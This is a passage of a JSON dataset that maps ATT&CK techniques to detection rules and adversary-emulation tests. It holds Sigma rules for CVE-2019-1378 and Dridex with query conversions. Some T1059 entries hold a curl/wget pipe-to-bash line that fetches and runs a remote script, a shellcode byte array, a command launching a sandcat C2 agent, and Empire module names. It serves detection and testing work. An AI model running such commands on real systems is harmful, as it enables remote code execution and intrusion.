"(ParentImage.keyword:*\\\\\\\\WINWORD.EXE AND Image.keyword:*\\\\\\\\FLTLDR.exe*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ParentImage=\"*\\\\\\\\WINWORD.EXE\" Image=\"*\\\\\\\\FLTLDR.exe*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage=\"*\\\\\\\\WINWORD.EXE\" Image=\"*\\\\\\\\FLTLDR.exe*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\WINWORD\\\\.EXE)(?=.*.*\\\\FLTLDR\\\\.exe.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Exploiting SetupComplete.cmd CVE-2019-1378\nid: 1c373b6d-76ce-4553-997d-8c1da9a6b5f5\nstatus: experimental\ndescription: Detects exploitation attempt of privilege escalation vulnerability via SetupComplete.cmd and PartnerSetupComplete.cmd decribed in CVE-2019-1378 \nreferences:\n    - https://www.embercybersecurity.com/blog/cve-2019-1378-exploiting-an-access-control-privilege-escalation-vulnerability-in-windows-10-update-assistant-wua\nauthor: Florian Roth\ndate: 2019/11/15\ntags:\n  - attack.defense_evasion\n  - attack.privilege_escalation\n  - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentCommandLine: \n            - '*\\cmd.exe /c C:\\Windows\\Setup\\Scripts\\SetupComplete.cmd'\n            - '*\\cmd.exe /c C:\\Windows\\Setup\\Scripts\\PartnerSetupComplete.cmd'\n    filter:\n        Image: \n            - 'C:\\Windows\\System32\\\\*'\n            - 'C:\\Windows\\SysWOW64\\\\*'\n            - 'C:\\Windows\\WinSxS\\\\*'\n            - 'C:\\Windows\\Setup\\\\*'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Exploiting SetupComplete.cmd CVE-2019-1378\nid: 1c373b6d-76ce-4553-997d-8c1da9a6b5f5\nstatus: experimental\ndescription: Detects exploitation attempt of privilege escalation vulnerability via SetupComplete.cmd and PartnerSetupComplete.cmd decribed in CVE-2019-1378 \nreferences:\n    - https://www.embercybersecurity.com/blog/cve-2019-1378-exploiting-an-access-control-privilege-escalation-vulnerability-in-windows-10-update-assistant-wua\nauthor: Florian Roth\ndate: 2019/11/15\ntags:\n  - attack.defense_evasion\n  - attack.privilege_escalation\n  - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentCommandLine: \n            - '*\\cmd.exe /c C:\\Windows\\Setup\\Scripts\\SetupComplete.cmd'\n            - '*\\cmd.exe /c C:\\Windows\\Setup\\Scripts\\PartnerSetupComplete.cmd'\n    filter:\n        Image: \n            - 'C:\\Windows\\System32\\\\*'\n            - 'C:\\Windows\\SysWOW64\\\\*'\n            - 'C:\\Windows\\WinSxS\\\\*'\n            - 'C:\\Windows\\Setup\\\\*'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentCommandLine.keyword:(*\\\\\\\\cmd.exe\\\\ \\\\/c\\\\ C\\\\:\\\\\\\\Windows\\\\\\\\Setup\\\\\\\\Scripts\\\\\\\\SetupComplete.cmd OR *\\\\\\\\cmd.exe\\\\ \\\\/c\\\\ C\\\\:\\\\\\\\Windows\\\\\\\\Setup\\\\\\\\Scripts\\\\\\\\PartnerSetupComplete.cmd) AND (NOT (Image.keyword:(C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\WinSxS\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\Setup\\\\\\\\*))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Exploiting-SetupComplete.cmd-CVE-2019-1378 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Exploiting SetupComplete.cmd CVE-2019-1378\",\\n    \"description\": \"Detects exploitation attempt of privilege escalation vulnerability via SetupComplete.cmd and PartnerSetupComplete.cmd decribed in CVE-2019-1378\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1055\"\\n    ],\\n    \"query\": \"(ParentCommandLine.keyword:(*\\\\\\\\\\\\\\\\cmd.exe\\\\\\\\ \\\\\\\\/c\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Setup\\\\\\\\\\\\\\\\Scripts\\\\\\\\\\\\\\\\SetupComplete.cmd OR *\\\\\\\\\\\\\\\\cmd.exe\\\\\\\\ \\\\\\\\/c\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Setup\\\\\\\\\\\\\\\\Scripts\\\\\\\\\\\\\\\\PartnerSetupComplete.cmd) AND (NOT (Image.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\SysWOW64\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\WinSxS\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Setup\\\\\\\\\\\\\\\\*))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentCommandLine.keyword:(*\\\\\\\\\\\\\\\\cmd.exe\\\\\\\\ \\\\\\\\/c\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Setup\\\\\\\\\\\\\\\\Scripts\\\\\\\\\\\\\\\\SetupComplete.cmd OR *\\\\\\\\\\\\\\\\cmd.exe\\\\\\\\ \\\\\\\\/c\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Setup\\\\\\\\\\\\\\\\Scripts\\\\\\\\\\\\\\\\PartnerSetupComplete.cmd) AND (NOT (Image.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\SysWOW64\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\WinSxS\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Setup\\\\\\\\\\\\\\\\*))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Exploiting SetupComplete.cmd CVE-2019-1378\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentCommandLine.keyword:(*\\\\\\\\cmd.exe \\\\/c C\\\\:\\\\\\\\Windows\\\\\\\\Setup\\\\\\\\Scripts\\\\\\\\SetupComplete.cmd *\\\\\\\\cmd.exe \\\\/c C\\\\:\\\\\\\\Windows\\\\\\\\Setup\\\\\\\\Scripts\\\\\\\\PartnerSetupComplete.cmd) AND (NOT (Image.keyword:(C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\WinSxS\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\Setup\\\\\\\\*))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((ParentCommandLine=\"*\\\\\\\\cmd.exe /c C:\\\\\\\\Windows\\\\\\\\Setup\\\\\\\\Scripts\\\\\\\\SetupComplete.cmd\" OR ParentCommandLine=\"*\\\\\\\\cmd.exe /c C:\\\\\\\\Windows\\\\\\\\Setup\\\\\\\\Scripts\\\\\\\\PartnerSetupComplete.cmd\") NOT ((Image=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\WinSxS\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\Setup\\\\\\\\*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentCommandLine IN [\"*\\\\\\\\cmd.exe /c C:\\\\\\\\Windows\\\\\\\\Setup\\\\\\\\Scripts\\\\\\\\SetupComplete.cmd\", \"*\\\\\\\\cmd.exe /c C:\\\\\\\\Windows\\\\\\\\Setup\\\\\\\\Scripts\\\\\\\\PartnerSetupComplete.cmd\"]  -(Image IN [\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\WinSxS\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\Setup\\\\\\\\*\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\cmd\\\\.exe /c C:\\\\Windows\\\\Setup\\\\Scripts\\\\SetupComplete\\\\.cmd|.*.*\\\\cmd\\\\.exe /c C:\\\\Windows\\\\Setup\\\\Scripts\\\\PartnerSetupComplete\\\\.cmd))(?=.*(?!.*(?:.*(?=.*(?:.*C:\\\\Windows\\\\System32\\\\\\\\.*|.*C:\\\\Windows\\\\SysWOW64\\\\\\\\.*|.*C:\\\\Windows\\\\WinSxS\\\\\\\\.*|.*C:\\\\Windows\\\\Setup\\\\\\\\.*))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Dridex Process Pattern\nid: e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e\nstatus: experimental\ndescription: Detects typical Dridex process patterns\nreferences:\n    - https://app.any.run/tasks/993daa5e-112a-4ff6-8b5a-edbcec7c7ba3\nauthor: Florian Roth\ndate: 2019/01/10\ntags:\n    - attack.defense_evasion\n    - attack.privilege_escalation\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine: '*\\svchost.exe C:\\Users\\\\*\\Desktop\\\\*'\n    selection2:\n        ParentImage: '*\\svchost.exe*'\n        CommandLine:\n            - '*whoami.exe /all'\n            - '*net.exe view'\n    condition: 1 of them\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Dridex Process Pattern\nid: e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e\nstatus: experimental\ndescription: Detects typical Dridex process patterns\nreferences:\n    - https://app.any.run/tasks/993daa5e-112a-4ff6-8b5a-edbcec7c7ba3\nauthor: Florian Roth\ndate: 2019/01/10\ntags:\n    - attack.defense_evasion\n    - attack.privilege_escalation\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine: '*\\svchost.exe C:\\Users\\\\*\\Desktop\\\\*'\n    selection2:\n        ParentImage: '*\\svchost.exe*'\n        CommandLine:\n            - '*whoami.exe /all'\n            - '*net.exe view'\n    condition: 1 of them\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:*\\\\\\\\svchost.exe\\\\ C\\\\:\\\\\\\\Users\\\\\\\\*\\\\\\\\Desktop\\\\\\\\* OR (ParentImage.keyword:*\\\\\\\\svchost.exe* AND CommandLine.keyword:(*whoami.exe\\\\ \\\\/all OR *net.exe\\\\ view)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Dridex-Process-Pattern <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Dridex Process Pattern\",\\n    \"description\": \"Detects typical Dridex process patterns\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1055\"\\n    ],\\n    \"query\": \"(CommandLine.keyword:*\\\\\\\\\\\\\\\\svchost.exe\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\Desktop\\\\\\\\\\\\\\\\* OR (ParentImage.keyword:*\\\\\\\\\\\\\\\\svchost.exe* AND CommandLine.keyword:(*whoami.exe\\\\\\\\ \\\\\\\\/all OR *net.exe\\\\\\\\ view)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:*\\\\\\\\\\\\\\\\svchost.exe\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\Desktop\\\\\\\\\\\\\\\\* OR (ParentImage.keyword:*\\\\\\\\\\\\\\\\svchost.exe* AND CommandLine.keyword:(*whoami.exe\\\\\\\\ \\\\\\\\/all OR *net.exe\\\\\\\\ view)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Dridex Process Pattern\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:*\\\\\\\\svchost.exe C\\\\:\\\\\\\\Users\\\\\\\\*\\\\\\\\Desktop\\\\\\\\* OR (ParentImage.keyword:*\\\\\\\\svchost.exe* AND CommandLine.keyword:(*whoami.exe \\\\/all *net.exe view)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*\\\\\\\\svchost.exe C:\\\\\\\\Users\\\\\\\\*\\\\\\\\Desktop\\\\\\\\*\" OR (ParentImage=\"*\\\\\\\\svchost.exe*\" (CommandLine=\"*whoami.exe /all\" OR CommandLine=\"*net.exe view\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (CommandLine=\"*\\\\\\\\svchost.exe C:\\\\\\\\Users\\\\\\\\*\\\\\\\\Desktop\\\\\\\\*\" OR (ParentImage=\"*\\\\\\\\svchost.exe*\" CommandLine IN [\"*whoami.exe /all\", \"*net.exe view\"])))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*.*\\\\svchost\\\\.exe C:\\\\Users\\\\\\\\.*\\\\Desktop\\\\\\\\.*|.*(?:.*(?=.*.*\\\\svchost\\\\.exe.*)(?=.*(?:.*.*whoami\\\\.exe /all|.*.*net\\\\.exe view)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=linux_audit preload_lib", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "-w /etc/ld.so.preload -p wa -k preload_lib", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=\"bash_history\" ld.so.preload | table host,user_name,bash_command", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}], "attack_paths": []}, {"commands": [{"source": "atomics/T1059/T1059.yaml", "command": "bash -c \"curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash\"\nbash -c \"wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash\"\n", "name": null}, {"source": "data/abilities/execution/134b49a3-3f93-41bd-85f4-563eadbb6055.yml", "command": {"windows": {"pwsh": {"command": "Get-Process -Name \"powershell\" | Stop-Process\n"}}}, "name": "Kill all PowerShell processes"}, {"source": "data/abilities/execution/2fe2d5e6-7b06-4fc0-bf71-6966a1226731.yml", "command": {"windows": {"psh": {"cleanup": ".\\wifi.ps1 -On\n", "command": ".\\wifi.ps1 -Off\n", "payload": "wifi.ps1"}}, "darwin": {"sh": {"cleanup": "./wifi.sh on\n", "command": "./wifi.sh off\n", "payload": "wifi.sh"}}, "linux": {"sh": {"cleanup": "./wifi.sh on\n", "command": "./wifi.sh off\n", "payload": "wifi.sh"}}}, "name": "Turn a computers WIFI off"}, {"source": "data/abilities/execution/a42dfc86-12f0-4f06-b0cf-24830c7f61f4.yml", "command": {"windows": {"shellcode_amd64": {"command": "0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3"}}}, "name": "Start a new calculator process"}, {"source": "data/abilities/execution/b1d41972-3ad9-4aa1-8f7f-05f049a2980e.yml", "command": {"darwin": {"sh": {"cleanup": "pkill -f sandcat\n", "command": "nohup ./sandcat.go -server #{server} &\n", "payload": "sandcat.go"}}, "linux": {"sh": {"cleanup": "pkill -f sandcat\n", "command": "nohup ./sandcat.go -server #{server} &\n", "payload": "sandcat.go"}}}, "name": "Start a new 54ndc47 agent in background"}, {"source": "SysmonHunter - Command-Line Interface", "command": "\\\\Windows\\\\.+\\\\cmd.exe", "name": null}, {"source": "SysmonHunter - Command-Line Interface", "command": "cmd.exe|/c", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_sqloscmd", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_sqloscmd", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/spawnas", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/spawnas", "name": "Empire Module Command"}], "command_list": ["bash -c \"curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash\"\nbash -c \"wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash\"\n", {"windows": {"pwsh": {"command": "Get-Process -Name \"powershell\" | Stop-Process\n"}}}, {"windows": {"psh": {"cleanup": ".\\wifi.ps1 -On\n", "command": ".\\wifi.ps1 -Off\n", "payload": "wifi.ps1"}}, "darwin": {"sh": {"cleanup": "./wifi.sh on\n", "command": "./wifi.sh off\n", "payload": "wifi.sh"}}, "linux": {"sh": {"cleanup": "./wifi.sh on\n", "command": "./wifi.sh off\n", "payload": "wifi.sh"}}}, {"windows": {"shellcode_amd64": {"command": "0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3"}}}, {"darwin": {"sh": {"cleanup": "pkill -f sandcat\n", "command": "nohup ./sandcat.go -server #{server} &\n", "payload": "sandcat.go"}}, "linux": {"sh": {"cleanup": "pkill -f sandcat\n", "command": "nohup ./sandcat.go -server #{server} &\n", "payload": "sandcat.go"}}}, "\\\\Windows\\\\.+\\\\cmd.exe", "cmd.exe|/c", "powershell/lateral_movement/invoke_sqloscmd", "powershell/lateral_movement/invoke_sqloscmd", "powershell/management/spawnas", "powershell/management/spawnas"], "technique_id": "T1059", "parsed_datasets": [{"Atomic Red Team Test - Command-Line Interface": {"display_name": "Command-Line Interface", "atomic_tests": [{"description": "Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.\n\nThis will download the specified payload and set a marker file in `/tmp/art-fish.txt`.\n", "supported_platforms": ["macos", "linux"], "name": "Command-Line Interface", "executor": {"command": "bash -c \"curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash\"\nbash -c \"wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash\"\n", "name": "sh"}}], "attack_technique": "T1059"}}, {"Mitre Stockpile - Kill all PowerShell processes": {"platforms": {"windows": {"pwsh": {"command": "Get-Process -Name \"powershell\" | Stop-Process\n"}}}, "description": "Kill all PowerShell processes", "tactic": "execution", "technique": {"attack_id": "T1059", "name": "Command-Line Interface"}, "id": "134b49a3-3f93-41bd-85f4-563eadbb6055", "name": "Stop PowerShell processes"}}, {"Mitre Stockpile - Turn a computers WIFI off": {"platforms": {"windows": {"psh": {"cleanup": ".\\wifi.ps1 -On\n", "command": ".\\wifi.ps1 -Off\n", "payload": "wifi.ps1"}}, "darwin": {"sh": {"cleanup": "./wifi.sh on\n", "command": "./wifi.sh off\n", "payload": "wifi.sh"}}, "linux": {"sh": {"cleanup": "./wifi.sh on\n", "command": "./wifi.sh off\n", "payload": "wifi.sh"}}}, "description": "Turn a computers WIFI off", "tactic": "execution", "technique": {"attack_id": "T1059", "name": "Command-Line Interface"}, "id": "2fe2d5e6-7b06-4fc0-bf71-6966a1226731", "name": "Disrupt WIFI"}}, {"Mitre Stockpile - Start a new calculator process": {"platforms": {"windows": {"shellcode_amd64": {"command": "0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3"}}}, "description": "Start a new calculator process", "tactic": "execution", "technique": {"attack_id": "T1059", "name": "Command-Line Interface"}, "id": "a42dfc86-12f0-4f06-b0cf-24830c7f61f4", "name": "Spawn calculator (shellcode)"}}, {"Mitre Stockpile - Start a new 54ndc47 agent in background": {"platforms": {"darwin": {"sh": {"cleanup": "pkill -f sandcat\n", "command": "nohup ./sandcat.go -server #{server} &\n", "payload": "sandcat.go"}}, "linux": {"sh": {"cleanup": "pkill -f sandcat\n", "command": "nohup ./sandcat.go -server #{server} &\n", "payload": "sandcat.go"}}}, "description": "Start a new 54ndc47 agent in background", "tactic": "execution", "technique": {"attack_id": "T1059", "name": "Command-Line Interface"}, "id": "b1d41972-3ad9-4aa1-8f7f-05f049a2980e", "name": "Start 54ndc47"}}, {"SysmonHunter - T1059": {"phase": "Execution", "query": [{"process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\cmd.exe", "flag": "regex"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "cmd.exe|/c", "op": "and"}}, "type": "process"}], "description": null, "name": "Command-Line Interface", "level": "medium"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1059", "Empire Module": "powershell/lateral_movement/invoke_sqloscmd", "Technique": "Command-Line Interface", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_sqloscmd\":  [\"T1059\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1059", "Empire Module": "powershell/management/spawnas", "Technique": "Command-Line Interface", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/spawnas\":  [\"T1059\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 and process_path contains \"cmd.exe\"", "product": "Azure Sentinel", "name": "Command Line Interface"}, {"query": "title: Hacktool Use\ndescription: This method detects well-known keywords, certain field combination that appear in Windows Eventlog when certain hack tools are used\nauthor: Florian Roth\ntags:\n    - attack.discovery\n    - attack.execution\n    - attack.t1087\n    - attack.t1075\n    - attack.t1114\n    - attack.t1059\nlogsource:\n    product: windows\n    service: security\ndetection:\n    # Ruler https://github.com/sensepost/ruler\n    selection1:\n        EventID: \n          - 4776\n          - 4624\n          - 4625\n        WorkstationName: 'RULER'\n    condition: selection1\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Hacktool Use\ndescription: This method detects well-known keywords, certain field combination that appear in Windows Eventlog when certain hack tools are used\nauthor: Florian Roth\ntags:\n    - attack.discovery\n    - attack.execution\n    - attack.t1087\n    - attack.t1075\n    - attack.t1114\n    - attack.t1059\nlogsource:\n    product: windows\n    service: security\ndetection:\n    # Ruler https://github.com/sensepost/ruler\n    selection1:\n        EventID: \n          - 4776\n          - 4624\n          - 4625\n        WorkstationName: 'RULER'\n    condition: selection1\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma 